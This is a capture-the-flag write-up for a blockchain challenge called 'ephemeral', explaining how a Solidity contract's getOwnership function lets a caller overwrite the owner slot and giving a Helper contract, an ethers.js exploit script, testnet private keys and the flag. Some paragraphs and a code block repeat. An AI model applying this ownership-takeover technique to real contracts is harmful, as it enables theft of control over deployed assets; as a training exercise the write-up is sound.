---
title: ephemeral
categories: Miscellaneous
tags: Blockchain
completedDuringEvent: true
submitted: true
flags: ARA6{sh0u7_out_70_3ph3me24l_prov1d3r5}
draft: false
---
## Scenario

> The Ethereum testnet are one of the great place to test out stuff. Try my new favorite testnet at https://ephemery.dev/.
>
> To get the flag, solve the challenge and paste your proof-of-work result into the remote interface below.
> 
> `nc 103.185.52.95 13378`

By thehxnz

## Solution

Generating the proof-of-work result from `pow.py`, the result is `734514167936362`. We can paste the result into the remote interface to get the server's response.

```sh
$ nc 103.185.52.95 13378
verifiyer 0.1.0
Using https://otter.bordel.wtf/erigon

Enter your PoW: 734514167936362
PoW is valid.
Creating setup contract...
Setup       : 0x2812007F73614B913fb314770BAe528f8B7fc912
Challenge   : 0x1944C4d052D1E6d4ae16654eff2ea9089b7587da
Your Address: 0x29AB03c3f9cFf0CE4188B0b5945745c3c1A39DEF
Private Key : 0x2f85c431ef33e2ac950661946ad27429ed711bd85edcd248157f351c0fffd445
RPC         : https://otter.bordel.wtf/erigon
```

So this will create a **Setup Contract** and a **Challenge Contract**. In the **Setup Contract** the `player` variable will be set to the address we provide, and will create a **Challenge Contract** with the `owner` variable, where the `owner` variable is set to `msg.sender` from the **Setup Contract**.

```
constructor() {
    owner = msg.sender;
}
```

To solve the challenge we need to change the `owner` of the **Challenge Contract** to the `player` that we provide.

```
function isSolved() external view returns (bool) {
    return IChallenge(challenge).owner() == player;
}
```

From the `transferOwnership` function we can see that we have to change the owner of the **Challenge Contract** to the `player` that we provide. However, we cannot change the `owner` of the **Challenge Contract** because it does not meet the condition` msg.sender == owner`. Where msg.sender is the player and `owner` is the **Setup Contract** that we provide.

```
function transferOwnership(address newOwner) external {
    require(msg.sender == owner, "Not owner");
    owner = newOwner;
}
```

From the `getOwnership` function we can see that check if the caller is a contract then `staticcall` the `account` and call the `gas`, then copy the data from the `returndata` to the `sstore` at slot 0.

```
function getOwnership(address account) external {
    assembly {
        let size := extcodesize(caller())
        if iszero(eq(size, 0)) {
            revert(0, 0)
        }
        let why := staticcall(gas(), account, 0, 0, 0, 0x20)
        
        if iszero(eq(returndatasize(), 0x20)) {
            revert(0, 0)
        }
        returndatacopy(0, 0, 0x20)
        sstore(0, mload(0))
    }
}
```

To solve the challenge we need to change the `owner` of the **Challenge Contract** to the `player` that we provide. We can do this by deploying a **Helper Contract** that will return the `target` address in the `fallback` function where we return the `target` address in the `returndata`. We can then call the `getOwnership` function with the **Helper Contract** address to write to the `sstore` at slot 0.

```
function getOwnership(address account) external {
    assembly {
        let size := extcodesize(caller())
        if iszero(eq(size, 0)) {
            revert(0, 0)
        }
        let why := staticcall(gas(), account, 0, 0, 0, 0x20)
       
        if iszero(eq(returndatasize(), 0x20)) {
            revert(0, 0)
        }
        returndatacopy(0, 0, 0x20)
        sstore(0, mload(0))
    }
}
```

To solve the challenge we need to change the `owner` of the **Challenge Contract** to the `player` that we provide. We can do this by deploying a **Helper Contract** that will return the `target` address in the fallback function where we return the `target` address in the `returndata`. We can then call the `getOwnership` function with the **Helper Contract** address to write to the `sstore` at slot 0.

```
pragma solidity ^0.8.0;
contract Helper {
    // 'target' is stored in slot 0.
    address public target;
    constructor(address _target) {
        target = _target;
    }
    // Fallback returns 32 bytes containing 'target'
    fallback() external {
        assembly {
            let t := sload(0)
            mstore(0, t)
            return(0, 32)
        }
    }
}
```

To automate the process, we can create a script using `ethers.js` to interact with the **Challenge Contract** and the **Helper Contract**.

```js
const { ethers, JsonRpcProvider } = require("ethers");
const solc = require("solc");

const SETUP_ADDRESS = "0xBaD1Bf25A3EB1786a0105F429fA63014eA092ea0";
const CHALLENGE_ADDRESS = "0xCf28A080bc6EcAf35764B1e39a8577082B56707b";
const ADDRESS = "0x49F9cdFb00EfA58962Fe062D91B8cCeccEFE5D25";
const PRIVATE_KEY = "0xf17789631ebf2eb733017fa1b6df40ace37ec1e0c8e4742996917b3f37aef572";
const RPC_URL = "https://otter.bordel.wtf/erigon";

const setupABI = ["function isSolved() external view returns (bool)"];
const challengeABI = [
    "function transferOwnership(address newOwner) external",
    "function getOwnership(address account) external",
    "function owner() external view returns (address)",
];

async function compileHelper() {
    const helperSource = `pragma solidity ^0.8.0;
contract Helper {
    // 'target' is stored in slot 0.
    address public target;
    constructor(address _target) {
        target = _target;
    }
    // Fallback returns 32 bytes containing 'target'
    fallback() external {
        assembly {
            let t := sload(0)
            mstore(0, t)
            return(0, 32)
        }
    }
}`;

    const input = {
        language: 'Solidity',
        sources: {
            'Helper.sol': {
                content: helperSource
            }
        },
        settings: {
            outputSelection: {
                '*': {
                    '*': ['*']
                }
            }
        }
    };

    const output = JSON.parse(solc.compile(JSON.stringify(input)));
    const compiledHelper = output.contracts["Helper.sol"]["Helper"];
    const helperAbi = compiledHelper.abi;
    const helperBytecode = compiledHelper.evm.bytecode.object;
    return [helperAbi, helperBytecode];
}

async function exploit() {
    const provider = new JsonRpcProvider(RPC_URL);
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    console.log("Connected as:", wallet.address);

    const setup = new ethers.Contract(SETUP_ADDRESS, setupABI, wallet);
    const challenge = new ethers.Contract(CHALLENGE_ADDRESS, challengeABI, wallet);

    console.log("Owner before exploit:", await challenge.owner());
    console.log("Is solved:", await setup.isSolved());

    const [helperAbi, helperBytecode] = await compileHelper();

    console.log("Deploying Helper contract...");
    const helperFactory = new ethers.ContractFactory(helperAbi, helperBytecode, wallet);
    const helper = await helperFactory.deploy(wallet.address);
    const helperAddress = await helper.getAddress();
    await helper.waitForDeployment();
    console.log("Helper deployed at:", helperAddress);

    console.log("Calling getOwnership with helper address...");
    const tx = await challenge.getOwnership(helperAddress);
    await tx.wait();
    console.log("Transaction confirmed");

    /* console.log("Transferring ownership to wallet...");
    const tx2 = await challenge.transferOwnership(wallet.address);
    await tx2.wait();
    console.log("Ownership transferred to wallet"); */

    console.log("Owner after exploit:", await challenge.owner());
    console.log("Is solved:", await setup.isSolved());
}

exploit();
```

After running the script, we can see that the `owner` of the **Challenge Contract** is changed to the `player` we provided. The `isSolved` function will return `true` if the `owner` of the **Challenge Contract** is the same as the `player` we provided.


```sh
$ nc 103.185.52.95 13378
verifiyer 0.1.0
Using https://otter.bordel.wtf/erigon

Enter your PoW: 734514167936362
PoW is valid.
Challenge solved!
ARA6{sh0u7_out_70_3ph3me24l_prov1d3r5}
```